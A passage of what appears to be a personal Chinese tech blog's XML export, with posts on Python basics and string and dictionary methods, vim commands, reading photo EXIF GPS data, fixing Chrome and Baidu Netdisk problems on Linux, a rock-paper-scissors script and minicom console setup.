align="left">元组长度(元素个数)</td></tr><tr><td align="left"></td><td align="left"><a href="method/if_in_元组.html">if 值 in 元组:</a></td><td align="left">判断元组中是否包含某个值</td></tr><tr><td align="left"></td><td align="left"><a href="method/index1_元组.html">元组.index(值)</a></td><td align="left">根据值查询索引，返回 第一个匹配项 的索引，没有查到会报错</td></tr><tr><td align="left"></td><td align="left"><a href="method/count_元组.html">元组.count(值)</a></td><td align="left">值在元组中出现的次数</td></tr></tbody></table><h3 id="3-字典操作"><a href="#3-字典操作" class="headerlink" title="3. 字典操作"></a>3. 字典操作</h3><table><thead><tr><th>分类</th><th>关键字 / 函数 / 方法</th><th>说明</th></tr></thead><tbody><tr><td>增加</td><td><a href="method/增加键值_字典.html">字典[键] = 值</a></td><td>键不存在，会添加键值对</td></tr><tr><td>删除</td><td><a href="method/删除键值_字典.html">字典.pop(键)</a></td><td>根据键删除键值对,返回被删除的值</td></tr><tr><td></td><td><a href="method/字典_del.html">del 字典[键]</a></td><td>根据键删除键值对</td></tr><tr><td></td><td><a href="method/字典_clear.html">字典.clear()</a></td><td>清空字典</td></tr><tr><td>修改</td><td><a href="method/修改键值_字典.html">字典[键] = 值</a></td><td>键存在，会修改键值对的值</td></tr><tr><td></td><td><a href="method/字典_update.html">字典.update(字典2)</a></td><td>取出字典2的键值对对字典1操作，键值对不存在，添加键值对；存在则修改值</td></tr><tr><td></td><td><a href="method/字典_setdefault.html">字典.setdefault(键，数据)</a></td><td>键值对不存在，添加键值对；存在则不做处理</td></tr><tr><td>查询</td><td><a href="method/查询值_字典.html">字典[键]</a></td><td>根据键取值，键值对不存在会报错</td></tr><tr><td></td><td><a href="method/get_字典.html">字典.get(键)</a></td><td>根据键取值，键值对不存在返回None, 不会报错</td></tr><tr><td></td><td><a href="method/遍历_字典.html">for key in 字典</a></td><td>遍历字典, 获取所有的键</td></tr><tr><td></td><td><a href="method/字典_keys.html">for key in 字典.keys()</a></td><td>遍历字典, 获取所有的键</td></tr><tr><td></td><td><a href="method/字典_values.html">for value in 字典.values()</a></td><td>遍历字典, 获取所有的值</td></tr><tr><td></td><td><a href="method/字典_items.html">for item in 字典.items()</a></td><td>遍历字典, 获取所有的键值对 (键, 值)</td></tr></tbody></table><h3 id="4-字符串操作"><a href="#4-字符串操作" class="headerlink" title="4. 字符串操作"></a>4. 字符串操作</h3><table><thead><tr><th>分类</th><th>关键字 / 函数 / 方法</th><th>说明</th></tr></thead><tbody><tr><td>分割</td><td><a href="method/字符串_split.html">字符串.split(分割符)</a></td><td>以分割符拆分字符串, 返回列表</td></tr><tr><td></td><td><a href="method/字符串_partition.html">字符串.partition(分割符)</a></td><td>返回元组，把字符串分成一个 3 元素的元组 (分割符前面, 分割符, 分割符后面)</td></tr><tr><td>拼接</td><td><a href="method/字符串_+.html">字符串 + 字符串</a></td><td>拼接两个字符串</td></tr><tr><td></td><td><a href="method/字符串_join.html">字符串.join(字符串列表)</a></td><td>以字符串来连接字符串列表中每个元素，合并为一个新的字符串</td></tr><tr><td>替换</td><td><a href="method/字符串_replace.html">字符串.replace(原内容, 新内容, 替换次数)</a></td><td>返回一个替换了原内容的新字符串，可以指定替换次数</td></tr><tr><td>查询</td><td><a href="method/字符串_find.html">字符串.find(目标字符串, 开始索引, 结束索引)</a></td><td>在指定范围内, 查询目标字符串的索引, 不存在返回-1</td></tr><tr><td></td><td><a href="method/字符串_rfind.html">字符串.rfind(目标字符串, 开始索引, 结束索引)</a></td><td>在指定范围内, 查询目标字符串的索引, 不存在返回-1, 从结尾处开始查找</td></tr><tr><td></td><td><a href="method/字符串_index.html">字符串.index(目标字符串, 开始索引, 结束索引)</a></td><td>在指定范围内, 查询目标字符串的索引, 不存在会报错</td></tr><tr><td>判断</td><td><a href="method/字符串_isalpha.html">字符串.isalpha()</a></td><td>如果 string 至少有一个字符并且所有字符都是字母则返回 True</td></tr><tr><td></td><td><a href="method/字符串_isdecimal.html">字符串.isdecimal()</a></td><td>如果 string 只包含数字则返回 True</td></tr><tr><td></td><td><a href="method/字符串_islower.html">字符串.islower()</a></td><td>如果 string 中包含至少一个区分大小写的字符，并且所有这些(区分大小写的)字符都是小写，则返回 True</td></tr><tr><td></td><td><a href="method/字符串_isupper.html">字符串.isupper()</a></td><td>如果 string 中包含至少一个区分大小写的字符，并且所有这些(区分大小写的)字符都是大写，则返回 True</td></tr><tr><td></td><td><a href="method/字符串_startswith.html">字符串.startswith(目标字符串)</a></td><td>检查字符串是否是以 目标字符串 开头，是则返回 True</td></tr><tr><td></td><td><a href="method/字符串_endswith.html">字符串.endswith(目标字符串)</a></td><td>检查字符串是否是以 目标字符串 结尾，是则返回 True</td></tr><tr><td>大小写转换</td><td><a href="method/字符串_lower.html">字符串.lower()</a></td><td>返回新字符串，转换 字符串 中所有大写字符为小写</td></tr><tr><td></td><td><a href="method/字符串_upper.html">字符串.upper()</a></td><td>返回新字符串，转换 字符串 中所有大写字符为大写</td></tr><tr><td>文本对齐</td><td><a href="method/字符串_center.html">字符串.center()</a></td><td>按照指定宽度返回新字符串，并基于原字符串居中，可设置两端空白位置的填充字符</td></tr><tr><td></td><td><a href="method/字符串_ljust.html">字符串.ljust()</a></td><td>按照指定宽度返回新字符串，并基于原字符串左对齐，可设置两端空白位置的填充字符</td></tr><tr><td></td><td><a href="method/字符串_rjust.html">字符串.rjust()</a></td><td>按照指定宽度返回新字符串，并基于原字符串右对齐，可设置两端空白位置的填充字符</td></tr><tr><td>去除两端字符</td><td><a href="method/字符串_strip.html">字符串.strip(目标字符串)</a></td><td>返回新字符串，去除 字符串 左右两边的目标字符串, 不设置目标字符串则去除空格</td></tr><tr><td></td><td><a href="method/字符串_lstrip.html">字符串.lstrip(目标字符串)</a></td><td>返回新字符串，去除 字符串 左边的目标字符串, 不设置目标字符串则去除空格</td></tr><tr><td></td><td><a href="method/字符串_rstrip.html">字符串.rstrip(目标字符串)</a></td><td>返回新字符串，去除 字符串 右边的目标字符串, 不设置目标字符串则去除空格</td></tr></tbody></table>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python基础01-python基础知识</title>
      <link href="/2020/07/25/2020-07-26python%E5%9F%BA%E7%A1%8001-python%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"/>
      <url>/2020/07/25/2020-07-26python%E5%9F%BA%E7%A1%8001-python%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/</url>
      
        <content type="html"><![CDATA[<h1 id="python基础知识"><a href="#python基础知识" class="headerlink" title="python基础知识"></a>python基础知识</h1><h2 id="一、计算机基础知识"><a href="#一、计算机基础知识" class="headerlink" title="一、计算机基础知识"></a>一、计算机基础知识</h2><p>1.硬件系统</p><a id="more"></a><p>主机：CPU、内存</p><p>外设：鼠标、键盘、显示器、硬盘</p><p>2.软件系统</p><p>软件系统分为：操作系统和应用软件</p><h2 id="二、认识python"><a href="#二、认识python" class="headerlink" title="二、认识python"></a>二、认识python</h2><ol><li>Python 是一种编程语言<ul><li>特点：解释性语言</li></ul></li><li>Python 的优缺点<ul><li>优点：简单、易学</li><li>缺点：效率低</li></ul></li><li>Python 应用场景：Web开发、数据科学、自动化开发等</li></ol><h2 id="三、基础语法"><a href="#三、基础语法" class="headerlink" title="三、基础语法"></a>三、基础语法</h2><h3 id="1-知道-注释"><a href="#1-知道-注释" class="headerlink" title="1.[知道] 注释"></a>1.[知道] 注释</h3><ul><li>对程序代码进行<strong>解释说明</strong>的文字，注释不是代码，不会执行</li><li>分类：单行注释、多行注释</li></ul><pre><code class="python"># 单行注释&quot;&quot;&quot;多行注释1&quot;&quot;&quot;&#39;&#39;&#39;多行注释2&#39;&#39;&#39;</code></pre><h5 id="2-了解-pycharm常用快捷键"><a href="#2-了解-pycharm常用快捷键" class="headerlink" title="2.[了解]pycharm常用快捷键"></a>2.[了解]pycharm常用快捷键</h5><pre><code class="python"># ctrl + /    注释，取消注释# ctrl + alt + l(字母)   代码格式化# ctrl + shift + f10 运行代码# ctrl + enter  换行</code></pre><h3 id="3-变量、类型、标示符"><a href="#3-变量、类型、标示符" class="headerlink" title="3.变量、类型、标示符"></a>3.变量、类型、标示符</h3><h4 id="3-1-重点-变量"><a href="#3-1-重点-变量" class="headerlink" title="3.1[重点] 变量"></a>3.1[重点] 变量</h4><p>变量作用：存储数据，类似于盒子、容器</p><pre><code class="python"># 变量作用：存储数据，理解为容器，盒子，装东西&quot;&quot;&quot;格式：变量名 = 数据1. =，叫做赋值符号2. 第一个操作叫赋值，第二次修改原来的变量&quot;&quot;&quot;# 定义一个变量a, 赋值为123，打印内容a = 123print(a)# 修改a变量的内容a = 250print(a)</code></pre><h4 id="3-2-重点-类型"><a href="#3-2-重点-类型" class="headerlink" title="3.2[重点] 类型"></a>3.2[重点] 类型</h4><pre><code class="python">&quot;&quot;&quot;250         int，整型3.14        float 浮点型&#39;abcd&#39;      字符串，只要是&#39;&#39;格式的内容就是字符串&quot;abcd&quot;      字符串，只要是&quot;&quot;格式的内容就是字符串True, False     bool, 布尔，计算True就是1， False就是0&quot;&quot;&quot;</code></pre><ul><li>python定义变量无需指定类型，自动推导类型</li><li>查看类型： type(变量名)</li></ul><pre><code># 定义变量，无需指定类型，自动推导a = 250# type(变量名)  获取变量的类型，需要打印后，才能看到print(type(a)) # &lt;class &#39;int&#39;&gt;b_str = &#39;abcd&#39;print(type(b_str)) # &lt;class &#39;str&#39;&gt;is_man = Falseprint(type(is_man)) # &lt;class &#39;bool&#39;&gt;</code></pre><h4 id="3-3-重点-标识符命名规则"><a href="#3-3-重点-标识符命名规则" class="headerlink" title="3.3[重点] 标识符命名规则"></a>3.3[重点] 标识符命名规则</h4><ul><li>标示符：变量名、函数</li><li>规则：<ul><li>由 <strong>字母</strong>、<strong>下划线</strong> 和 <strong>数字</strong> 组成</li><li><strong>不能以数字开头</strong></li><li><strong>不能与关键字重名</strong></li><li>建议不要和类型同名，如：<code>int</code>、<code>str</code></li></ul></li></ul><h4 id="3-4-了解-变量命名规范"><a href="#3-4-了解-变量命名规范" class="headerlink" title="3.4[了解] 变量命名规范"></a>3.4[了解] 变量命名规范</h4><ul><li>见名知意</li><li>Python变量名、函数名：<code>my_name, send_buf</code></li><li>驼峰命名：<ul><li>小驼峰：<code>myName, sendBuf</code></li><li>大驼峰：<code>MyName, SendBuf</code></li></ul></li></ul><h4 id="3-5-了解-关键字"><a href="#3-5-了解-关键字" class="headerlink" title="3.5[了解] 关键字"></a>3.5[了解] 关键字</h4><p>关键字：有特定功能的标示符，起名不能和关键字重名</p><pre><code class="python"># 1. 导入工具包import keyword# 2. 打印关键字print(keyword.kwlist)</code></pre><h3 id="4-输出和输入"><a href="#4-输出和输入" class="headerlink" title="4.输出和输入"></a>4.输出和输入</h3><h4 id="4-1-重点-输出"><a href="#4-1-重点-输出" class="headerlink" title="4.1[重点] 输出"></a>4.1[重点] 输出</h4><ul><li>%d:  整数</li><li>%s: 字符串</li><li>%f: 小数</li></ul><pre><code class="python">旧式写法：print(&#39;整数：%d, 字符串：%s, 小数：%f&#39;%(250, &#39;abcd&#39;, 3.14))新式写法：print(f&#39;整数{250},字符串{&#39;abcd&#39;},小数{3.14}&#39;)</code></pre><h4 id="4-2-重点-输入"><a href="#4-2-重点-输入" class="headerlink" title="4.2[重点] 输入"></a>4.2[重点] 输入</h4><ul><li><p>输入后得到内容的类型是字符串类型</p></li><li><p>格式：</p><pre><code class="python">字符串变量 = input(&#39;提示信息：&#39;)</code></pre></li><li><p>看变量是什么类型，通过<code>type(变量名)</code>来查看</p></li></ul><h4 id="4-3-重点-类型转换"><a href="#4-3-重点-类型转换" class="headerlink" title="4.3[重点] 类型转换"></a>4.3[重点] 类型转换</h4><pre><code class="python"># int(x) 转换为整型# float(x) 转换为浮点型# str(x) 转换为字符串# 将整型的a转换为字符串类型，再给a_str赋值a = 250a_str = str(a)print(a_str, type(a_str))# 将字符串的b转换为整型，再给b_int赋值b = &quot;123&quot;b_int = int(b)print(b_int, type(b_int))# 浮点型转换为字符串c = 3.14c_str = str(c)print(c_str, type(c_str))# 字符串转浮点型d = &#39;1.23&#39;d_float = float(d)print(d_float, type(d_float))</code></pre><h4 id="5-知道-算术、赋值、复合赋值运算符"><a href="#5-知道-算术、赋值、复合赋值运算符" class="headerlink" title="5.[知道] 算术、赋值、复合赋值运算符"></a>5.[知道] 算术、赋值、复合赋值运算符</h4><ul><li>算术：<ul><li>%：取余，一个数余数为0，就是偶数</li><li>9%2结果不为0，所以为奇数</li></ul></li><li>赋值<ul><li>a = 2</li></ul></li><li>符合赋值<ul><li>a = 0, a += 1</li></ul></li></ul><pre><code class="python"># 算术运算符&quot;&quot;&quot;*   乘/   除//  取整数商%   取余数**  次方&quot;&quot;&quot;print(3 * 3)  # 9print(5 / 2)  # 2.5print(9 // 2)  # 4print(9 % 2)  # 1print(2 ** 3)  # 8# 赋值a = 2a = a + 1print(a)  # 3# 复合赋值a = 2a += 1  # a = a + 1print(a)  # 3</code></pre><h2 id="四、学习方法"><a href="#四、学习方法" class="headerlink" title="四、学习方法"></a>四、学习方法</h2><ol><li><p>看笔记，看目录，回忆内容</p><ul><li>如果有代码，回忆不起来，不要总想，没有太大意义</li></ul></li><li><p>代码学习：切忌光看不练</p><ul><li>直接运行讲师写的代码，运行看效果：验证自己的想法和效果是否一致</li><li>屏蔽代码，抄代码，改代码：减少写错概率</li><li>重头写：练习</li></ul></li></ol>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pyhon </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>谷歌浏览器中密码消失了</title>
      <link href="/2020/07/02/2020-07-03-%E8%B0%B7%E6%AD%8C%E6%B5%8F%E8%A7%88%E5%99%A8%E4%B8%AD%E5%AF%86%E7%A0%81%E6%B6%88%E5%A4%B1%E4%BA%86/"/>
      <url>/2020/07/02/2020-07-03-%E8%B0%B7%E6%AD%8C%E6%B5%8F%E8%A7%88%E5%99%A8%E4%B8%AD%E5%AF%86%E7%A0%81%E6%B6%88%E5%A4%B1%E4%BA%86/</url>
      
        <content type="html"><![CDATA[<p>最近我的谷歌浏览器出现了一个问题，打开设置&gt;密码&gt;已保存的密码为空。就是保存的密码都消失了，我没有清理过密码的操作。</p><a id="more"></a><p>一开始我以为是密码没有同步成功，所以我开了FQ,然后重新打开谷歌浏览器，发现并没有用。</p><p>按照网上的做法：</p><p>退出用户重新登录也不行</p><p>重装谷歌浏览器也不行</p><p>谷歌云账号的账号密码都还在;</p><p>我在第二个系统查看我的谷歌浏览器是正常的，说明我的账号是没问题的。</p><p>后面终于在网络上找到了一个有效的处理方法：</p><p>亲测使用移除用户的方式有效<br>打开谷歌浏览器<br>点击用户图标<br>点击管理用户<br>把鼠标移动用户图标上面会显示三个点的图标<br>点击三个点的图标<br>选择移除用户<br>重新登录用户<br>即可恢复正常</p>]]></content>
      
      
      <categories>
          
          <category> 随笔 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 教程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>使用Python读取照片的GPS信息</title>
      <link href="/2020/06/20/2020-06-21-%E4%BD%BF%E7%94%A8Python%E8%AF%BB%E5%8F%96%E7%85%A7%E7%89%87%E7%9A%84GPS%E4%BF%A1%E6%81%AF/"/>
      <url>/2020/06/20/2020-06-21-%E4%BD%BF%E7%94%A8Python%E8%AF%BB%E5%8F%96%E7%85%A7%E7%89%87%E7%9A%84GPS%E4%BF%A1%E6%81%AF/</url>
      
        <content type="html"><![CDATA[<p>现在很多手机都支持相机定位功能，即拍出来的照片携带GPS信息，那么问题来了，如何把ＧPS信息提取出来呢，这就需要用到工具了，网络上有不少工具，其中一种便是使用python来实现这个功能。</p><a id="more"></a><pre><code class="python">import exifreadphoto = input(&#39;请输入要查找的图片(＊＊＊.jpg):&#39;)# /run/media/manjaro/DATA/Download/ 是存放图片的路径info = open(&#39;/run/media/manjaro/DATA/Download/%s&#39; % photo, &#39;rb&#39;)contents = exifread.process_file(info)print(&#39;=&#39; * 50)for key in contents:    if key == &quot;GPS GPSLongitude&quot;:        print(&quot;经度=&quot;, contents[key], contents[&#39;GPS GPSLongitudeRef&#39;])    elif key == &quot;GPS GPSLatitude&quot;:        print(&quot;纬度=&quot;, contents[key], contents[&#39;GPS GPSLatitudeRef&#39;])    elif key == &#39;Image DateTime&#39;:        print(&quot;拍摄时间=&quot;, contents[key])    elif key == &#39;Image Make&#39;:        print(&#39;手机品牌=&#39;, contents[key])    elif key == &#39;Image Model&#39;:        print(&#39;手机型号=&#39;, contents[key])print(&#39;=&#39; * 50)</code></pre>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pyhon </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>vim使用命令总结</title>
      <link href="/2020/06/19/2020-06-20-vim%E4%BD%BF%E7%94%A8%E5%91%BD%E4%BB%A4%E6%80%BB%E7%BB%93/"/>
      <url>/2020/06/19/2020-06-20-vim%E4%BD%BF%E7%94%A8%E5%91%BD%E4%BB%A4%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<p>vim在linux中是必须使用的一个的神器，编辑文件的利器，掌握一些vim指令还是挺有必要的，vim的使用教程在网上一搜就一大把，但那都是别人写的，即使把它们下载下来放进电脑里还是会记不住，所以自己实践过一遍指令再作出一个属于自己的笔记才会更加深刻。我目前记录的就只有这些指令，后期继续更新……</p><a id="more"></a><h3 id="定位到故障行-15行"><a href="#定位到故障行-15行" class="headerlink" title="定位到故障行:15行"></a>定位到故障行:15行</h3><p>vim test.py +15</p><h3 id="打开文件直接定位到最底端："><a href="#打开文件直接定位到最底端：" class="headerlink" title="打开文件直接定位到最底端："></a>打开文件直接定位到最底端：</h3><p>vim test.py +</p><p>文件顶部：gg<br>文件末尾：G<br>移动到15行：    15gg、15G         （：15 回车  也可以快速到达15行）</p><h3 id="向上翻页"><a href="#向上翻页" class="headerlink" title="向上翻页"></a>向上翻页</h3><p>ctrl b           (back)</p><h3 id="向下翻页"><a href="#向下翻页" class="headerlink" title="向下翻页"></a>向下翻页</h3><p>ctrl f           (forword)</p><p>移动到当前屏幕的顶部：H     （ head）<br>移动到当前屏幕的中间：M     （middle)<br>移动到当前屏幕的底部：L       （low）</p><p>段首：{<br>段尾：}</p><p>行首：shift+6   ^<br>行尾：shift+4   $</p><p>括号匹配： %</p><h3 id="标记"><a href="#标记" class="headerlink" title="标记"></a>标记</h3><p>m+（a～z） 例如ma<br>回到标记<br>‘a</p><p>可视模式：v<br>可视行模式：V<br>可视块模式：ctrl v</p><h3 id="删除全部内容"><a href="#删除全部内容" class="headerlink" title="删除全部内容"></a>删除全部内容</h3><p>gg      文件顶部<br>V     可视行模式<br>G     文件末尾<br>d      删除</p><h3 id="撤销"><a href="#撤销" class="headerlink" title="撤销"></a>撤销</h3><p>u</p><p>ctrl + r  恢复撤销</p><h3 id="删除命令"><a href="#删除命令" class="headerlink" title="删除命令"></a>删除命令</h3><p>dw    从光标位置删除到单词末尾<br>d0     从光标位置删除到一行的起始位置<br>d}       从光标位置删除到段落结尾<br>ndd    从光标位置向下连续删除n行<br>d代码行G   从光标所在行删除到指定代码行之间的所有代码<br>d’a      从光标所在行删除到标记a之间的所有代码</p><h3 id="复制、粘帖"><a href="#复制、粘帖" class="headerlink" title="复制、粘帖"></a>复制、粘帖</h3><p>y 复制<br>yy  复制行    Y也是复制行<br>nyy 复制n行<br>p 粘帖     （ 小p是在行后粘帖，大P是在行前粘帖）<br>10p 粘帖10次</p><h3 id="替换"><a href="#替换" class="headerlink" title="替换"></a>替换</h3><p>r 从光标当前开始替换<br>R 替换模式</p><h3 id="缩进"><a href="#缩进" class="headerlink" title="缩进"></a>缩进</h3><p>向右增加缩进&gt;&gt;<br>&lt;&lt; 向左减少缩进<br>.  重复上次命令</p><h3 id="查找"><a href="#查找" class="headerlink" title="查找"></a>查找</h3><p>/str<br>n 向下查找<br>N 向上查找</p><p>*向下查找</p><p>#向上查找</p><h3 id="取消查找高亮"><a href="#取消查找高亮" class="headerlink" title="取消查找高亮"></a>取消查找高亮</h3><p>命令模式下，输入:nohlsearch  也可以:set nohlsearch； 当然，可以简写，noh或者set noh。</p><h3 id="全局替换"><a href="#全局替换" class="headerlink" title="全局替换"></a>全局替换</h3><p>:%s///g<br>:%s/hello/world/g    将全部的hello替换成world<br>可视区域替换<br>:s///g<br>确认替换<br>:%s///gc</p><h3 id="利用可视块注释多行代码"><a href="#利用可视块注释多行代码" class="headerlink" title="利用可视块注释多行代码"></a>利用可视块注释多行代码</h3><p>ctrl v    进入可视块模式<br>j             向下选择要注释的行<br>I             输入大写I进入编辑模式,不能使用小写i</p><p> 输入#号</p><p>esc        退出可视块模式</p><h3 id="vim删除空行和注释"><a href="#vim删除空行和注释" class="headerlink" title="vim删除空行和注释"></a>vim删除空行和注释</h3><p>来源：  <a href="http://jpuyy.com/2015/06/vim-delete-lines-using-regexp.html" target="_blank" rel="noopener">http://jpuyy.com/2015/06/vim-delete-lines-using-regexp.html</a></p><p>删除空行</p><p>:g/^$/d</p><p>删除空行以及只有空格的行</p><p>:g/^\s*$/d</p><p>删除以 # 开头或 空格# 或 tab#开头的行</p><p>:g/^\s*#/d</p><p>对于 php.ini 配置文件，注释为 ; 开头</p><p>:g/^\s*;/d</p><p>使用正则表达式删除行</p><p>如果当前行包含 bbs ，则删除当前行</p><p>:/bbs/d</p><p>删除从第二行到包含 bbs 的区间行</p><p>:2,/bbs/d</p><p>删除从包含 bbs 的行到最后一行区间的行</p><p>:/bbs/,$d</p><p>删除所有包含 bbs 的行</p><p>:g/bbs/d</p><p>删除匹配 bbs 且前面只有一个字符的行</p><p>:g/.bbs/d</p><p>删除匹配 bbs 且以它开头的行</p><p>:g/^bbs/d</p><p>删除匹配 bbs 且以它结尾的行</p><p>:g/bbs$/d</p><p>.ini 的注释是以 ; 开始的，如果注释不在行开头，那么删除 ; 及以后的字符</p><p>:%s/;.+//g</p><p>删除 # 之后所有字符</p><p>%s/#.*//g</p><h3 id="vim设置编码格式"><a href="#vim设置编码格式" class="headerlink" title="vim设置编码格式"></a>vim设置编码格式</h3><p>先利用vim打开指定文件 </p><p>:set ff  查看当前文本的模式类型，一般为dos,unix<br>:set ff=dos  设置为dos模式， 也可以用 sed -i ‘s/$/\r/‘<br>:set ff=unix  设置为unix模式，也可以用一下方式转换为unix模式:sed -i ‘s/.$//g’<br>:set fileencoding查看现在文本的编码<br>:set fenc=编码  转换当前文本的编码为指定的编码<br>:set enc=编码  以指定的编码显示文本，但不保存到文件中。</p><h3 id="vim配置优化"><a href="#vim配置优化" class="headerlink" title="vim配置优化"></a>vim配置优化</h3><p>sudo vim /etc/vimrc</p><p>set autoread<br>filetype plugin on<br>filetype on<br>set clipboard+=unnamed<br>set nobackup<br>set noswapfile<br>set syntax=on<br>set autoindent<br>set cindent<br>set tabstop=4<br>set softtabstop=4<br>set shiftwidth=4<br>set smarttab<br>set number<br>set ignorecase<br>set hlsearch<br>set incsearch<br>set selection=exclusive<br>set selectmode=mouse,key<br>set mouse=a</p><p>:inoremap ( ()<ESC>i<br>:inoremap ) <c-r>=ClosePair(‘)’)<CR><br>:inoremap { {<CR>}<ESC>O<br>:inoremap } <c-r>=ClosePair(‘}’)<CR><br>:inoremap “ “”<ESC>i<br>:inoremap ‘ ‘’<ESC>i</p><h3 id="vim设置鼠标复制粘贴"><a href="#vim设置鼠标复制粘贴" class="headerlink" title="vim设置鼠标复制粘贴"></a>vim设置鼠标复制粘贴</h3><p>启动鼠标定位功能：<br>set mouse=a</p><p>启用鼠标复制粘贴功能：<br>vim打开一个文件后，如需要复制文本，则在末行模式下输入<br>：set mouse-=a<br>即可使用鼠标右键复制粘贴功能</p>]]></content>
      
      
      <categories>
          
          <category> 教程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>manjaro百度网盘打不开解决方法</title>
      <link href="/2020/06/11/2020-06-12-manjaro%E7%99%BE%E5%BA%A6%E7%BD%91%E7%9B%98%E6%89%93%E4%B8%8D%E5%BC%80%E8%A7%A3%E5%86%B3%E6%96%B9%E6%B3%95/"/>
      <url>/2020/06/11/2020-06-12-manjaro%E7%99%BE%E5%BA%A6%E7%BD%91%E7%9B%98%E6%89%93%E4%B8%8D%E5%BC%80%E8%A7%A3%E5%86%B3%E6%96%B9%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<p> 最近更新了一下百度网盘之后，发现打不开了，就是在百度网盘启动界面一直在加载状态，一开始我以为是软件不兼容的问题，就重装软件了，但发现还是一样，重启系统还是一样，就上网找答案，找到了一个有效答案，在网络上找答案太混杂，容易鱼目混珠，杂七杂八的答案都有，所以写篇博客记录一下。</p><a id="more"></a><p>故障现象：</p><p>百度网盘linux版本更新之后就打不开了，一直处在加载状态</p><p>解决方法:</p><p>删除百度网盘的配置文件</p><p>sudo rm -rf /home/username/.local/share/baidu/</p><p>username是用户的名字</p><p>到此搞定。</p>]]></content>
      
      
      <categories>
          
          <category> 教程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 教程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python编写石头剪刀布游戏</title>
      <link href="/2020/06/02/2020-06-03-python%E7%BC%96%E5%86%99%E7%9F%B3%E5%A4%B4%E5%89%AA%E5%88%80%E5%B8%83%E6%B8%B8%E6%88%8F/"/>
      <url>/2020/06/02/2020-06-03-python%E7%BC%96%E5%86%99%E7%9F%B3%E5%A4%B4%E5%89%AA%E5%88%80%E5%B8%83%E6%B8%B8%E6%88%8F/</url>
      
        <content type="html"><![CDATA[<p>平时在生活中难免会遇到两个人要面临不同选择的时候，石头剪刀布就是常用的伎俩，简单又粗暴，但真人玩石头剪刀布的时候难免会出现一些错误，例如，双方出拳速度不一样又或者出错拳，还有就是出拳规律被对方掌握了等，这些情况就导致了不公平的现象发生。为了解决这个问题，使用Python编写一个石头剪刀布小游戏，就可以保证游戏的公平性了。</p><a id="more"></a><p>网络上有很多现成的Python案例了，我看了别人写的案例，虽然能用，但不能满足我的需求，所以我借鉴了网上的案例而改写了满足自己需求的石头剪刀布小游戏。这是我目前临时写出来的python代码，还没进行优化，后面我再进行改善吧。</p><pre><code class="Python">&quot;&quot;&quot;石头剪刀布游戏三次机会只需要输入1,2,3数字&quot;&quot;&quot;import randomcount = 3while count:    a = input(&quot;请出拳（石头1/剪刀2/布3)：&quot;)    if a in [&#39;1&#39;, &#39;2&#39;, &#39;3&#39;]:        if a == &#39;1&#39;:            c = &#39;石头&#39;        elif a == &#39;2&#39;:            c = &#39;剪刀&#39;        elif a == &#39;3&#39;:            c = &#39;布&#39;    else:        print(&#39;只能选择1~3之间的数字&#39;)        continue    b = [&#39;剪刀&#39;, &#39;石头&#39;, &#39;布&#39;]    # 定义赢的列表    win_list = [[&#39;石头&#39;, &#39;剪刀&#39;], [&#39;剪刀&#39;, &#39;布&#39;], [&#39;布&#39;, &#39;石头&#39;]]    # 电脑随机选择出拳    computer = random.choice(b)    print(&#39;你出拳：&#39;, c)    print(&quot;电脑出拳：&quot;, computer)    if c in b:        count -= 1        if c == computer:            print(&quot;平局&quot;)        elif [c, computer] in win_list:            # 如果在赢的列表中，代表你赢了            print(&quot;恭喜，你赢了&quot;)        else:            print(&quot;很遗憾，你输了&quot;)    print(&quot;你还剩余机会&quot;, count)</code></pre>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 教程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>linux连接交换机console</title>
      <link href="/2020/05/29/2020-05-30-linux%E8%BF%9E%E6%8E%A5%E4%BA%A4%E6%8D%A2%E6%9C%BAconsole/"/>
      <url>/2020/05/29/2020-05-30-linux%E8%BF%9E%E6%8E%A5%E4%BA%A4%E6%8D%A2%E6%9C%BAconsole/</url>
      
        <content type="html"><![CDATA[<p>自从用了linux做主力系统之后，有很多习惯都要改变了，今天想连接一台交换机，结果方法跟windows一点也不相同，我也是通过网络上的教程才连上的，特意写个自己总结后的文章，方便自己后面查看。</p><a id="more"></a><h3 id="第一步：查看usb端口名称"><a href="#第一步：查看usb端口名称" class="headerlink" title="第一步：查看usb端口名称"></a>第一步：查看usb端口名称</h3><p>sudo dmesg | grep usb</p><h3 id="第二步：安装minicom"><a href="#第二步：安装minicom" class="headerlink" title="第二步：安装minicom"></a>第二步：安装minicom</h3><p> sudo apt install minicom<br>        sudo yum install minicom<br>        sudo  pacman -S minicom</p><p>manjaro 可以通过软件商店安装</p><h3 id="第三步：打开minicom设置"><a href="#第三步：打开minicom设置" class="headerlink" title="第三步：打开minicom设置"></a>第三步：打开minicom设置</h3><p>sudo minicom -s</p><pre><code>        +-----[configuration]------+        | Filenames and paths      |        | File transfer protocols  |        | Serial port setup        |        | Modem and dialing        |        | Screen and keyboard      |        | Save setup as dfl        |        | Save setup as..          |        | Exit                     |        | Exit from Minicom        |        +--------------------------+</code></pre><p>选中 | Serial port setup        |  回车</p><pre><code>+-----------------------------------------------------------------------+| A -    Serial Device      : /dev/ttyUSB0                              || B - Lockfile Location     : /var/run                                  || C -   Callin Program      :                                           || D -  Callout Program      :                                           || E -    Bps/Par/Bits       : 9600 8N1                                  || F - Hardware Flow Control : No                                        || G - Software Flow Control : No                                        ||                                                                       ||    Change which setting?                                              |+-----------------------------------------------------------------------+</code></pre><p>选择A 修改相应的usb名称<br>       选择E  修改波特率9600<br>       选择F 